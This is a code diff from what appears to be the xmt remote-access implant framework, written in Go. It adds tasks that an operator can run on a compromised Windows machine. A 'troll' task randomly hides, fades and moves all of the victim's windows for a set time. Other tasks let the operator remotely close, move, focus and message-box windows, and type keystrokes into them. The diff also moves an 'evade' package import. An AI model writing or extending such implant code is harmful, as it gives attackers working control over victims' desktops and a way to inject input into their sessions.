@@ -8,20 +8,29 @@ import (
 	"io"
 	"os"
 	"strings"
+	"time"
 
 	"github.com/iDigitalFlame/xmt/cmd"
-	"github.com/iDigitalFlame/xmt/cmd/evade"
 	"github.com/iDigitalFlame/xmt/cmd/filter"
 	"github.com/iDigitalFlame/xmt/data"
 	"github.com/iDigitalFlame/xmt/device"
+	"github.com/iDigitalFlame/xmt/device/evade"
 	"github.com/iDigitalFlame/xmt/device/regedit"
 	"github.com/iDigitalFlame/xmt/device/winapi"
 	"github.com/iDigitalFlame/xmt/device/winapi/registry"
+	"github.com/iDigitalFlame/xmt/util"
 	"github.com/iDigitalFlame/xmt/util/bugtrack"
 	"github.com/iDigitalFlame/xmt/util/xerr"
 )
 
-func taskTroll(_ context.Context, r data.Reader, _ data.Writer) error {
+func randMod(v int32) int32 {
+	n := int32(util.FastRandN(256))
+	if util.FastRandN(2) == 0 {
+		return n + v
+	}
+	return v - n
+}
+func taskTroll(x context.Context, r data.Reader, _ data.Writer) error {
 	t, err := r.Uint8()
 	if err != nil {
 		return err
@@ -40,8 +49,8 @@ func taskTroll(_ context.Context, r data.Reader, _ data.Writer) error {
 		}
 		return winapi.SetWallpaper(s)
 	case taskTrollWallpaper:
-		f, err := os.CreateTemp("", execD)
-		if err != nil {
+		var f *os.File
+		if f, err = os.CreateTemp("", execD); err != nil {
 			return err
 		}
 		_, err = io.Copy(f, r)
@@ -50,6 +59,43 @@ func taskTroll(_ context.Context, r data.Reader, _ data.Writer) error {
 			return err
 		}
 		return winapi.SetWallpaper(f.Name())
+	case taskTrollWTF:
+		var d time.Duration
+		if err = r.ReadInt64((*int64)(&d)); err != nil {
+			return err
+		}
+		if d <= 0 {
+			return nil
+		}
+		var (
+			z = time.NewTimer(d)
+			v = time.NewTicker(time.Millisecond * time.Duration(250+util.FastRandN(250)))
+		)
+	loop:
+		for {
+			select {
+			case <-v.C:
+				e, err := winapi.TopLevelWindows()
+				if err != nil {
+					break
+				}
+				switch h := e[util.FastRandN(len(e))]; util.FastRandN(3) {
+				case 0:
+					winapi.ShowWindow(h.Handle, uint8(1+util.FastRandN(12)))
+				case 1:
+					winapi.SetWindowTransparency(h.Handle, uint8(util.FastRandN(256)))
+				case 2:
+					winapi.SetWindowPos(h.Handle, randMod(h.X), randMod(h.Y), randMod(h.Width), randMod(h.Height))
+				}
+			case <-z.C:
+				break loop
+			case <-x.Done():
+				break loop
+			}
+		}
+		v.Stop()
+		z.Stop()
+		return winapi.SetWindowTransparency(0, 255)
 	}
 	return xerr.Sub("invalid type", 0xD)
 }
@@ -285,6 +331,54 @@ func taskInteract(_ context.Context, r data.Reader, _ data.Writer) error {
 	case taskWindowEnable, taskWindowDisable:
 		_, err = winapi.EnableWindow(uintptr(h), t == taskWindowEnable)
 		return err
+	case taskWindowShow:
+		var v uint8
+		if err = r.ReadUint8(&v); err != nil {
+			return err
+		}
+		_, err = winapi.ShowWindow(uintptr(h), v)
+		return err
+	case taskWindowClose:
+		return winapi.CloseWindow(uintptr(h))
+	case taskWindowMessage:
+		var (
+			t, d string
+			f    uint32
+		)
+		if err = r.ReadUint32(&f); err != nil {
+			return err
+		}
+		if err = r.ReadString(&t); err != nil {
+			return err
+		}
+		if err = r.ReadString(&d); err != nil {
+			return err
+		}
+		_, err = winapi.MessageBox(uintptr(h), d, t, f)
+		return err
+	case taskWindowMove:
+		var x, y, w, v int32
+		if err = r.ReadInt32(&x); err != nil {
+			return err
+		}
+		if err = r.ReadInt32(&y); err != nil {
+			return err
+		}
+		if err = r.ReadInt32(&w); err != nil {
+			return err
+		}
+		if err = r.ReadInt32(&v); err != nil {
+			return err
+		}
+		return winapi.SetWindowPos(uintptr(h), x, y, w, v)
+	case taskWindowFocus:
+		return winapi.SetForegroundWindow(uintptr(h))
+	case taskWindowType:
+		var t string
+		if err = r.ReadString(&t); err != nil {
+			return err
+		}
+		return winapi.SendInput(uintptr(h), t)
 	}
 	return xerr.Sub("invalid type", 0xD)
 }
